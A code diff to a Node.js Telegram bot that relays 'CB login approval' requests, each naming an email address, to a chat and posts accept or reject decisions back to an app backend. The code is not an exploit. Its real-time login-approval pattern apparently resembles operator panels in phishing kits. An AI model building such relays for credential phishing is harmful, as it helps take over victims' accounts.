@@ -1,12 +1,13 @@
+// bot.js
 import TelegramBot from "node-telegram-bot-api";
 import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const CHAT_ID = process.env.CHAT_ID; // your existing env variable
 const APP_URL = process.env.APP_URL;
 
-if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
-  console.error("Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
+if (!BOT_TOKEN || !CHAT_ID || !APP_URL) {
+  console.error("Missing BOT_TOKEN, CHAT_ID, or APP_URL in environment");
   process.exit(1);
 }
 
@@ -16,8 +17,7 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // -----------------
 // CB Login approval
 // -----------------
-export async function sendLoginTelegram(email) {
-  const message = `*CB login approval*\n*Email:* ${email}`;
+export function sendLoginTelegram(email) {
   const options = {
     parse_mode: "Markdown",
     reply_markup: {
@@ -29,7 +29,9 @@ export async function sendLoginTelegram(email) {
       ]
     }
   };
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+
+  const message = `*CB login approval*\n*Email:* ${email}`;
+  bot.sendMessage(CHAT_ID, message, options);
 }
 
 // -----------------
@@ -40,28 +42,26 @@ bot.on("callback_query", async (query) => {
     const [action, email] = query.data.split("|");
     const status = action === "accept" ? "accepted" : "rejected";
 
-    // Update backend
+    // Notify backend
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, status })
     });
 
+    // Answer callback query
     await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
 
     // Update message in Telegram
-    await bot.editMessageText(
-      `*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`,
-      {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id,
-        parse_mode: "Markdown"
-      }
-    );
+    await bot.editMessageText(`*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`, {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      parse_mode: "Markdown"
+    });
 
   } catch (err) {
     console.error("❌ Failed to handle callback:", err);
-    await bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
+    bot.sendMessage(CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
   }
 });
 
